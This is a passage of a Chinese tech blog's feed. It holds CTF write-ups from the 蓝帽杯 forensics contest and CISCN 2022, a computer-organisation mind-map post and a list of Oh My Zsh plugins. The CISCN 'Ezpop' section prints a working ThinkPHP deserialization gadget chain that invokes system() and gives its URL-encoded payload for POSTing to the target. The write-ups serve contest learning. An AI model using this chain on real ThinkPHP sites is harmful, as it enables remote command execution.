EXEC.apk</p><p>2、找到入口</p><p><img src="/img/lanmao6/clip_image024.jpg"></p><h3 id="flag值：-8"><a href="#flag值：-8" class="headerlink" title="flag值："></a>flag值：</h3><p>minmtta.hemjcbm.ahibyws.MainActivity</p><h3 id="题目序号17-程序分析-3"><a href="#题目序号17-程序分析-3" class="headerlink" title="题目序号17 程序分析_3"></a>题目序号17 程序分析_3</h3><p>本程序的服务器地址的密文是？</p><h3 id="操作内容：-9"><a href="#操作内容：-9" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、提取class.dex，反编译成class.jar，jd打开</p><p>2、MainActivity中找到base64加密代码</p><p>3、解码为：<a href="https://ansjk.ecxeio.xyz/"></a></p><p><img src="/img/lanmao6/clip_image026.jpg"></p><h3 id="flag值：-9"><a href="#flag值：-9" class="headerlink" title="flag值："></a>flag值：</h3><p>aHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</p><h3 id="题目序号19-网站取证-1"><a href="#题目序号19-网站取证-1" class="headerlink" title="题目序号19 网站取证_1"></a>题目序号19 网站取证_1</h3><p>据了解，某网上商城系一团伙日常资金往来用，从2022年4月1日起使用虚拟币GG币进行交易，现已获得该网站的源代码以及部分数据库备份文件，请您对以下问题进行分析解答。</p><p>请从网站源码中找出木马文件，并提交木马连接的密码。</p><h3 id="操作内容：-10"><a href="#操作内容：-10" class="headerlink" title="操作内容："></a>操作内容：</h3><p>1、D盾扫webshell</p><p>2、得WWW\runtime\temp\0f71e181346d43e56722aec663e5d4e9.php文件为吗，打开查看连接密码</p><p><img src="/img/lanmao6/clip_image028.jpg"></p><h3 id="flag值：-10"><a href="#flag值：-10" class="headerlink" title="flag值："></a>flag值：</h3><p>lanmaobei666</p><h3 id="题目序号20-网站取证-2"><a href="#题目序号20-网站取证-2" class="headerlink" title="题目序号20 网站取证_2"></a>题目序号20 网站取证_2</h3><h3 id="请提交数据库连接的明文密码。（答案参考格式：abcABC123）"><a href="#请提交数据库连接的明文密码。（答案参考格式：abcABC123）" class="headerlink" title="请提交数据库连接的明文密码。（答案参考格式：abcABC123）"></a>请提交数据库连接的明文密码。（答案参考格式：abcABC123）</h3><h3 id="操作内容：-11"><a href="#操作内容：-11" class="headerlink" title="操作内容："></a>操作内容：</h3><ol><li><p>加密函数的php源代码在目录www\application\encrypt下的encrypt.php</p></li><li><p>观察函数解密逻辑，并简单重写调试一下，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/r/n&quot;</span>, <span class="string">&quot;/r&quot;</span>, <span class="string">&quot;/n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;PanGuShi&#x27;</span>;</span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$td</span> = mcrypt\_module\<span class="title function_ invoke__">_open</span>(MCRYPT\_RIJNDAEL\_128,<span class="string">&quot;&quot;</span>,MCRYPT\_MODE\_CBC,<span class="string">&quot;&quot;</span>);</span><br><span class="line">mcrypt\_generic\<span class="title function_ invoke__">_init</span>(<span class="variable">$td</span>, <span class="string">&quot;PanGuShi&quot;</span>, <span class="variable">$iv</span>);</span><br><span class="line"><span class="variable">$decode</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$dencrypted</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>, <span class="variable">$decode</span>);</span><br><span class="line">mcrypt\_generic\<span class="title function_ invoke__">_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line">mcrypt\_module\<span class="title function_ invoke__">_close</span>(<span class="variable">$td</span>);</span><br><span class="line"><span class="variable">$dencrypted</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$dencrypted</span>);</span><br><span class="line"><span class="comment">// echo $str;</span></span><br><span class="line"><span class="comment">// echo $iv;</span></span><br><span class="line"><span class="comment">// echo $td;</span></span><br><span class="line"><span class="comment">// echo $decode;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dencrypted</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>运行php代码，得到解密后的明文密码，即flag值</p></li></ol><p><img src="/img/lanmao6/clip_image030.gif"></p><p>flag值：KBLT123</p><h3 id="题目序号21-网站取证-3"><a href="#题目序号21-网站取证-3" class="headerlink" title="题目序号21 网站取证_3"></a>题目序号21 网站取证_3</h3><h3 id="请提交数据库金额加密混淆使用的盐值。"><a href="#请提交数据库金额加密混淆使用的盐值。" class="headerlink" title="请提交数据库金额加密混淆使用的盐值。"></a>请提交数据库金额加密混淆使用的盐值。</h3><h3 id="操作内容：-12"><a href="#操作内容：-12" class="headerlink" title="操作内容："></a>操作内容：</h3><p>全局搜索money关键词，发现与加密相关函数及其key。</p><p><img src="/img/lanmao6/clip_image032.gif"></p><h3 id="flag值：-11"><a href="#flag值：-11" class="headerlink" title="flag值："></a>flag值：</h3><p>jyzg123456</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;😋蓝帽杯又名取证杯，原来是被队友带飞的一天，有被爽到！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;题目序号2-Domainhacker&quot;&gt;&lt;a href=&quot;#题目序号2-Domainhacker&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络空间安全" scheme="https://dxhm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://dxhm.github.io/tags/CTF/"/>
    
    <category term="蓝帽杯" scheme="https://dxhm.github.io/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/"/>
    
    <category term="取证技术" scheme="https://dxhm.github.io/tags/%E5%8F%96%E8%AF%81%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>408 COMPUTER PRINCIPLES MIND MAP</title>
    <link href="https://dxhm.github.io/2022/06/04/408com-mindmap/"/>
    <id>https://dxhm.github.io/2022/06/04/408com-mindmap/</id>
    <published>2022-06-03T16:17:01.000Z</published>
    <updated>2023-06-30T14:04:33.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h1><h1 id="第二章-数据表示与运算"><a href="#第二章-数据表示与运算" class="headerlink" title="第二章 数据表示与运算"></a>第二章 数据表示与运算</h1><p><img src="/img/com_mind_map/CODE.png" alt="IO.png"></p><h1 id="第三章-存储系统"><a href="#第三章-存储系统" class="headerlink" title="第三章 存储系统"></a>第三章 存储系统</h1><p><img src="/img/com_mind_map/MEM.png" alt="MEM.png"></p><h1 id="第四章-指令系统"><a href="#第四章-指令系统" class="headerlink" title="第四章 指令系统"></a>第四章 指令系统</h1><h1 id="第五章-CPU"><a href="#第五章-CPU" class="headerlink" title="第五章 CPU"></a>第五章 CPU</h1><p><img src="/img/com_mind_map/CPU.png" alt="IO.png"></p><h1 id="第六章-总线"><a href="#第六章-总线" class="headerlink" title="第六章 总线"></a>第六章 总线</h1><p><img src="/img/com_mind_map/LINE.png" alt="IO.png"></p><h1 id="第七章-I-x2F-O系统"><a href="#第七章-I-x2F-O系统" class="headerlink" title="第七章 I&#x2F;O系统"></a>第七章 I&#x2F;O系统</h1><p><img src="/img/com_mind_map/IO.png" alt="IO.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一章-概述&quot;&gt;&lt;a href=&quot;#第一章-概述&quot; class=&quot;headerlink&quot; title=&quot;第一章 概述&quot;&gt;&lt;/a&gt;第一章 概述&lt;/h1&gt;&lt;h1 id=&quot;第二章-数据表示与运算&quot;&gt;&lt;a href=&quot;#第二章-数据表示与运算&quot; class=&quot;header</summary>
      
    
    
    
    <category term="计算机综合" scheme="https://dxhm.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%BC%E5%90%88/"/>
    
    <category term="408计算机" scheme="https://dxhm.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%BC%E5%90%88/408%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    
    <category term="计算机组成原理" scheme="https://dxhm.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>【WP】FIFTEENTH CISCN (PART)</title>
    <link href="https://dxhm.github.io/2022/05/29/ciscn15/"/>
    <id>https://dxhm.github.io/2022/05/29/ciscn15/</id>
    <published>2022-05-29T11:32:00.000Z</published>
    <updated>2023-07-12T09:13:54.863Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="4-调查问卷"><a href="#4-调查问卷" class="headerlink" title="4. 调查问卷"></a>4. 调查问卷</h2><img width="273" height="152" src="/img/ciscn15/clip_image006.png" v:shapes="图片_x0020_6"><img width="381" height="145" src="/img/ciscn15/clip_image008.png" v:shapes="图片_x0020_1"><ul><li><strong>flag值：flag{Thanksforplayingourgames}</strong></li></ul><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-签到电台"><a href="#1-签到电台" class="headerlink" title="1. 签到电台"></a>1. 签到电台</h2><p>此题与摩斯电码关系不大</p><ol><li><p>输入<code>···</code>启动后BurpSuit抓个包</p></li><li><p>可以直接进行url<code>?msg=xxxx</code>传递</p></li><li><p>前往公众号获取提示</p><p> <img src="/img/ciscn15/791b051d1069024a94daeb6088ae9d85.png" alt="791b051d1069024a94daeb6088ae9d85.png"></p></li><li><p>按照网址提供的<strong>密码本</strong>前28位，与7个电码逐位相加mod10</p><p> <img src="/img/ciscn15/11d9f4b5684c6db2c80405469cd555e7.png" alt="11d9f4b5684c6db2c80405469cd555e7.png"></p></li><li><p>回到repeater，得到flag</p><p> <img src="/img/ciscn15/d371e53295e989db066669aa100f4d76.png" alt="d371e53295e989db066669aa100f4d76.png"></p></li></ol><ul><li><p><strong>flag：flag{2adc3f3c-0264-4bb5-bea4-fec4d788bb23}</strong></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="4-Ezpop"><a href="#4-Ezpop" class="headerlink" title="4. Ezpop"></a>4. Ezpop</h2></li><li><p>thinkphp 框架</p></li></ul><ol><li><p>发现网址目录下有源码<code>/www.zip</code>，下载下来分析</p></li><li><p>根据<code>/public/index.php</code>源码和注释提示构造 payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span> = <span class="title class_">false</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;cat$&#123;IFS&#125;/flag.txt&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = True;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;whoami&#x27;</span> =&gt; [<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;json = [<span class="string">&#x27;whoami&#x27;</span>,[<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;jsonAssoc = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span>(<span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>()))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>运行一下php代码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure></li><li><p>POST方式提交到<code>/index.php/index/test</code>得到flag</p><p> <img src="/img/ciscn15/09b19555a94fb43eed78855b59ef272c.png" alt="09b19555a94fb43eed78855b59ef272c.png"></p></li></ol><ul><li><strong>flag: flag{85d52d33-9e9b-42a7-9970-fbe62641acf3}</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;4-调查问卷&quot;&gt;&lt;a href=&quot;#4-调查问卷&quot; class=&quot;headerlink&quot; title=&quot;4. 调查</summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络空间安全" scheme="https://dxhm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://dxhm.github.io/tags/CTF/"/>
    
    <category term="ciscn" scheme="https://dxhm.github.io/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>Plugins for Oh My Zsh</title>
    <link href="https://dxhm.github.io/2022/04/29/ohmyzsh-plugins/"/>
    <id>https://dxhm.github.io/2022/04/29/ohmyzsh-plugins/</id>
    <published>2022-04-29T05:49:49.000Z</published>
    <updated>2023-07-07T16:03:32.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用实用plugins列举"><a href="#常用实用plugins列举" class="headerlink" title="常用实用plugins列举"></a>常用实用plugins列举</h1><p>ohmyzsh自带</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git：常用的git命令缩写</span><br><span class="line">z：自动跳转</span><br><span class="line">extract：一键解压，通过x命令解压任何类型的压缩文件</span><br><span class="line">history：查看历史命令</span><br><span class="line">sudo：esc快捷sudo</span><br><span class="line">rand-quote：quote生成随机名言</span><br><span class="line">fortune：冷笑话</span><br><span class="line">themes：手动切换主题</span><br><span class="line">gitignore：python模板</span><br><span class="line"><span class="meta">#</span><span class="language-bash">gi python &gt; .gitignore</span></span><br><span class="line">cp：cpv使用rsync实现带进度条的复制功能</span><br><span class="line">zsh_reload</span><br><span class="line">git-open</span><br><span class="line">colored-man-pages：带颜色的man</span><br></pre></td></tr></table></figure><p>独立安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zsh-syntax-highlighting：命令高亮</span><br><span class="line">zsh-autosuggestions：命令自动补齐</span><br><span class="line"><span class="meta">#</span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span></span><br><span class="line">autojump：快速跳转文件夹</span><br></pre></td></tr></table></figure><h1 id="以下为官方Wiki-for-plugins"><a href="#以下为官方Wiki-for-plugins" class="headerlink" title="以下为官方Wiki for plugins"></a>以下为官方Wiki for plugins</h1><blockquote><p><em>This wiki is automatically published from <a href="https://github.com/ohmyzsh/wiki">ohmyzsh&#x2F;wiki</a>. To edit this page,</em><br><em>go to <a href="https://github.com/ohmyzsh/wiki">ohmyzsh&#x2F;wiki</a>, make your changes and submit a Pull Request.</em></p><blockquote><p>更多使用插件：<a href="https://github.com/zsh-users">https://github.com/zsh-users</a><br>如： zsh-syntax-highlighting、zsh-autosuggestions</p></blockquote></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>Oh My Zsh comes bundled with plugins, which allow you to take advantage of functionality of many sorts to your shell just by enabling them. They are<br>each documented in the README file in their respective <code>plugins/</code> folder.</p><p>Enable a plugin by adding its name to the <code>plugins</code> array in your <code>.zshrc</code> file (found in the <code>$HOME</code><br>directory). For example, this enables the <code>rails</code>, <code>git</code> and <code>ruby</code> plugins, <strong>in that order</strong>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugins=(rails git ruby)</span><br></pre></td></tr></table></figure><p><strong><em>NOTE: elements in zsh arrays are separated by whitespace (spaces, tabs, newlines…). DO NOT use commas.</em></strong></p><h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><ul><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/1password">1password</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/adb">adb</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ag">ag</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/aliases">aliases</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/alias-finder">alias-finder</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ansible">ansible</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ant">ant</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/apache2-macports">apache2-macports</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/arcanist">arcanist</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/archlinux">archlinux</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/asdf">asdf</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/autoenv">autoenv</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/autojump">autojump</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/autopep8">autopep8</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/aws">aws</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/battery">battery</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/bazel">bazel</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/bbedit">bbedit</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/bedtools">bedtools</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/bgnotify">bgnotify</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/boot2docker">boot2docker</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/bower">bower</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/branch">branch</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/brew">brew</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/bundler">bundler</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/cabal">cabal</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/cake">cake</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/cakephp3">cakephp3</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/capistrano">capistrano</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/cask">cask</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/catimg">catimg</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/celery">celery</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/chruby">chruby</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/chucknorris">chucknorris</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/cloudfoundry">cloudfoundry</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/codeclimate">codeclimate</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/coffee">coffee</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/colemak">colemak</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/colored-man-pages">colored-man-pages</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/colorize">colorize</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/command-not-found">command-not-found</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/common-aliases">common-aliases</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/compleat">compleat</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/composer">composer</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/copybuffer">copybuffer</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/copydir">copydir</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/copyfile">copyfile</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/cp">cp</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/cpanm">cpanm</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/dash">dash</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/debian">debian</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/deno">deno</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/dircycle">dircycle</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/direnv">direnv</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/dirhistory">dirhistory</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/dirpersist">dirpersist</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/dnf">dnf</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/dnote">dnote</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/docker">docker</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/docker-compose">docker-compose</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/docker-machine">docker-machine</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/doctl">doctl</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/dotenv">dotenv</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/dotnet">dotnet</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/droplr">droplr</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/drush">drush</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/eecms">eecms</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/emacs">emacs</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ember-cli">ember-cli</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/emoji">emoji</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/emoji-clock">emoji-clock</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/emotty">emotty</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/encode64">encode64</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/extract">extract</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fabric">fabric</a></li><li><a 